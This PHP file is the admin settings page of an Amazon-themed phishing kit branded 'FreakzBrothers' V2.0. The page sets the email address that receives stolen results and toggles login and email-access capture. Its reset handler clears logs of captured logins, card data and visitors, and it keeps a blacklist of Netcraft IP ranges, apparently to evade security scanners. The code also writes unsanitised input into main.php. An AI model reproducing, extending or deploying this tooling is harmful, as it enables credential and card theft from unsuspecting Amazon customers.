<?php
/*
* #====================================================================================================================#
* ######################################################################################################################
* # ███████╗██████╗#███████╗#█████╗#██╗##██╗███████╗██████╗ ██████╗##██████╗#████████╗██╗##██╗███████╗██████╗#███████╗##
* # ██╔════╝██╔══██╗██╔════╝██╔══██╗██║ ██╔╝╚══███╔╝██╔══██╗██╔══██╗██╔═══██╗╚══██╔══╝██║##██║██╔════╝██╔══██╗██╔════╝##
* # █████╗##██████╔╝█████╗##███████║█████╔╝###███╔╝#██████╔╝██████╔╝██║###██║###██║###███████║█████╗##██████╔╝███████╗##
* # ██╔══╝##██╔══██╗██╔══╝##██╔══██║██╔═██╗##███╔╝##██╔══██╗██╔══██╗██║###██║###██║###██╔══██║██╔══╝##██╔══██╗╚════██║##
* # ██║#####██║##██║███████╗██║##██║██║##██╗███████╗██████╔╝██║##██║╚██████╔╝###██║###██║##██║███████╗██║##██║███████║##
* # ╚═╝#####╚═╝##╚═╝╚══════╝╚═╝##╚═╝╚═╝##╚═╝╚══════╝╚═════╝#╚═╝##╚═╝#╚═════╝####╚═╝###╚═╝##╚═╝╚══════╝╚═╝##╚═╝╚══════╝##
* ######################################################################################################################
* ####################################### Copyright © FREAKZBROTHERS X AMAZON 2019 #####################################
* #====================================================================================================================#
*/

@require_once "../main.php";
error_reporting(0);
include '../config/config.php';
 
session_start();
if($_SESSION['user'] == ""){
header('location: ../login.php');
}
 
$off = $_GET['account'];
if(isset($off)){
  if($off == 'off'){
    session_destroy();
    unset($_SESSION['user']);
    session_unset();
    header('location: ../login.php');
  }
  else{
    echo '';
  }
}
?>
<!DOCTYPE html>
<html>

<head>
  <title>FreakzBrothers: Amazon</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
  <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
  <link rel="shortcut icon" href="amazon/Assets/img/favicon.ico" />
</head>
<body>
  <style type="text/css">
    .angka {
      font-weight: bold;
      font-size: 30px;
      float: right;
      margin-right: 10%
    }

    .text-warning {
      color: #FFC107
    }

    footer {
      font-size: 10px;
      font-weight: bold;
      font-family: arial;
      position: fixed;
      bottom: 0;
      right: 0;
      background: black;
      color: white;
      padding: 2px
    }

    .text-warning {
      color: #FFC107
    }
  </style>
  <div class="container">
    <nav class="navbar navbar-expand-sm bg-dark navbar-dark">
    <ul class="navbar-nav">
      <h1 style="display: inline-block; color: white;">&nbsp;&nbsp;&nbsp;<i class="fa fa-amazon spacer-small"></i>
        <but>
          <font color="red"><b>Freakz<font color="white">Brothers&nbsp;<font color="lime">V2.0</font>
            </b>
      </h1>
      </div>
  </nav><br>

<nav class="navbar navbar-expand-lg">
  <div class="container">
    <table class="table">
      <thead class="thead-dark">
        <tr>
          <th>
            <center><h4><i class="fa fa-cog fa-1x"></i>&nbsp;SETTINGS</h4></center>
          </th>
          <th>
            <center><h4><i class="fa fa-caret-right fa-1x"></i>&nbsp;NEW</h4></center>
          </th>
          <th>
            <center><h4><i class="fa fa-code fa-1x"></i>&nbsp;OLD</h4></center>
          </th>
          <th>
            <center><h4><i class="fa fa-check fa-1x"></i>&nbsp;ACTION</h4></center>
          </th>
        </tr>
        <form method="POST">
          <tr>
            <td>
              <font color="black"><b>Email Result</b></font>
            </td>
            <td><input name="baru" class="form-control" placeholder="your@email.com" /></td>
            <td><input type="text" class="form-control" size="30" name="lama" value="<?php echo $result; ?>" required="required" readonly=""></td>
            <td><input name="email" class="btn btn-dark btn-block" type="submit" Value="Save" /></td>
          </tr>
        </form>
        <form method="POST">
          <tr>
            <td>
              <font color="black"><b>Setting Parameter</b></font>
            </td>
            <td><input name="paramB" class="form-control" placeholder="_amazon" /></td>
            <td><input type="text" class="form-control" size="30" name="paramL" value="<?php echo $parameter; ?>" required="required" readonly=""></td>
            <td><input name="parameter" class="btn btn-dark btn-block" type="submit" Value="Save" /></td>
          </tr>
        </form>
        <form method="POST">
          <tr>
            <td>
              <font color="black"><b>Send Login</b></font>
            </td>
            <td><select name="sendloginb" class="form-control" />
              <option disabled selected>SELECT</option>
              <option>ON</option>
              <option>OFF</option></td>
            <td><input type="text" class="form-control" size="30" name="sendloginl" value="<?php echo $sendlog; ?>" required="required" readonly=""></td>
            <td><input name="sendlog" class="btn btn-dark btn-block" type="submit" Value="Save" /></td>
          </tr>
        </form>
        <form method="POST">
          <tr>
            <td>
              <font color="black"><b>OneTime</b></font>
            </td>
            <td><select name="onetimeb" class="form-control" />
              <option disabled selected>SELECT</option>
              <option>YES</option>
              <option>NO</option></td>
            <td><input type="text" class="form-control" size="30" name="onetimel" value="<?php echo $onetime; ?>" required="required" readonly=""></td>
            <td><input name="onetime" class="btn btn-dark btn-block" type="submit" Value="Save" /></td>
          </tr>
        </form>
        <form method="POST">
          <tr>
            <td>
              <font color="black"><b>Email Access</b></font>
            </td>
            <td><select name="emailaccb" class="form-control" />
              <option disabled selected>SELECT</option>
              <option>IYA</option>
              <option>TIDAK</option></td>
            <td><input type="text" class="form-control" size="30" name="emailaccl" value="<?php echo $email_access; ?>" required="required" readonly=""></td>
            <td><input name="emailacc" class="btn btn-dark btn-block" type="submit" Value="Save" /></td>
          </tr>
        </form>
      </thead>
    </table>
  </div>
</nav><br>
  <form method="POST" action"">
    <center>
        <a href="index.php?account=on" class="btn btn-link">
          <font color="purple"><b><i class="fa fa-caret-left"></i>&nbsp;&nbsp;&nbsp;BACK</b></font>
        </a>
    </center>
  </form>
  <footer>
    <font color="green">Copyright</font> &copy; <font color="red">Freakz</font>
    <font color="white">Brothers</font> 2019.
  </footer>
</body>

</html>
<?php
   unlink("set.php");
 
    $lama           = trim($_POST['lama']);
    $baru           = trim($_POST['baru']);
    $onetimel        = trim($_POST['onetimel']);
    $onetimeb        = trim($_POST['onetimeb']);
	  $email_accl     = trim($_POST['emailaccl']);
    $email_accb     = trim($_POST['emailaccb']);
    $sendloginl     = trim($_POST['sendloginl']);
    $sendloginb     = trim($_POST['sendloginb']);
    $paramL        = trim($_POST['paramL']);
    $paramB        = trim($_POST['paramB']);
    $file           = "../main.php";
    $isi            = file_get_contents($file);
 
if(isset($_POST['email'])) {
    if(preg_match("#\b$lama\b#is", $isi)) {
        $isi = str_replace($lama,$baru,$isi);
        $buka = fopen($file,'w');
        fwrite($buka,$isi);
        fclose($buka);
 
        echo "<script>alert('Success')</script>";
        echo "<meta http-equiv='refresh' content='0; url=#ganti_email'/>";
          echo "<meta http-equiv='refresh' content='0; url=#ganti_email'/>";
    }
    else
         echo "<script>alert('Failed')</script>";
}
else if(isset($_POST['onetime'])) {
   if(preg_match("#\b$onetimel\b#is", $isi)) {
        $isi = str_replace($onetimel,$onetimeb,$isi);
        $buka = fopen($file,'w');
        fwrite($buka,$isi);
        fclose($buka);
 
        echo "<script>alert('Success')</script>";
        echo "<meta http-equiv='refresh' content='0; url=#onetime'/>";
          echo "<meta http-equiv='refresh' content='0; url=#onetime'/>";
    }
    else
         echo "<script>alert('Failed')</script>";
}else if(isset($_POST['emailacc'])) {
   if(preg_match("#$email_accl#is", $isi)) {
        $isi = str_replace($email_accl,$email_accb,$isi);
        $buka = fopen($file,'w');
        fwrite($buka,$isi);
        fclose($buka);
        echo "<script>alert('Success')</script>";
        echo "<meta http-equiv='refresh' content='0; url=#email_access'/>";
          echo "<meta http-equiv='refresh' content='0; url=#email_access'/>";
    }
    else
         echo "<script>alert('Failed')</script>";
}else if(isset($_POST['sendlog'])) {
   if(preg_match("#$sendloginl#is", $isi)) {
        $isi = str_replace($sendloginl,$sendloginb,$isi);
        $buka = fopen($file,'w');
        fwrite($buka,$isi);
        fclose($buka);
        echo "<script>alert('Success')</script>";
        echo "<meta http-equiv='refresh' content='0; url=#send_login'/>";
          echo "<meta http-equiv='refresh' content='0; url=#send_login'/>";
    }
    else
         echo "<script>alert('Failed')</script>";
}else if(isset($_POST['parameter'])) {
   if(preg_match("#$paramL#is", $isi)) {
        $isi = str_replace($paramL,$paramB,$isi);
        $buka = fopen($file,'w');
        fwrite($buka,$isi);
        fclose($buka);
        echo "<script>alert('Success')</script>";
        echo "<meta http-equiv='refresh' content='0; url=#change_parameter'/>";
          echo "<meta http-equiv='refresh' content='0; url=#change_parameter'/>";
    }
    else
         echo "<script>alert('Failed')</script>";
}
else if(isset($_POST['rd'])) {
       unlink("../log/click.txt");
       unlink("../log/login.txt");
       unlink("../log/cc.txt");
       unlink("../log/visitor.txt");
       unlink("error_log");
 
       $filee = file_get_contents("assets/includes/blacklist.dat");
       $cek = preg_match_all("/# NETCRAFT IP RANGES(.*)# USERS COMPLETED/is", $filee, $res) ? $res : null;
       $buka = fopen("assets/includes/blacklist.dat",'w');
       fwrite($buka,$cek[0][0]."\r\r");
       fclose($buka);
 
       echo "<script>alert('Success')</script>";
       echo "<meta http-equiv='refresh' content='0; url=#reset_data'/>";
		 echo "<meta http-equiv='refresh' content='0; url=#reset_data'/>";
}
?>